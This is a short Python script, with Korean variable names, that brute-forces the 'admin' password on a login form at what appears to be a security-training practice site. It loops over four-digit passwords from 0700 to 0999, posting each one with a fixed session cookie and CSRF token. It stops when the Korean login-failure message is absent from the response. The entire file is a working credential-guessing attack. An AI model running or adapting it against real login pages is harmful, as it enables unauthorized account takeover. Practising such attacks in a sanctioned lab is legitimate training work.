import requests


주소 = "https://lab.eqst.co.kr:8110/practice/practice02/login"

헤더 = {    
    "Content-Type": "application/x-www-form-urlencoded"
}

쿠키 = {
    "JSESSIONID":"119FAB8D9D90628E6ED8C99313137A97"
}

데이터 = {
    "_csrf":"06173405-0796-4b11-8aa1-7afa57019433",
    "memberid":"admin",
    "password":"9999"
}

for i in range(700,1000):
    pw = str(i).zfill(4)
    데이터['password']=pw 
    응답 = requests.post(주소, headers=헤더, cookies=쿠키, data=데이터)
    if '로그인에 실패했습니다.' in 응답.text:
        print(f'[{pw}] 비번 틀렸어!')
    else:
        print(f"[{pw}] 성공!")
        break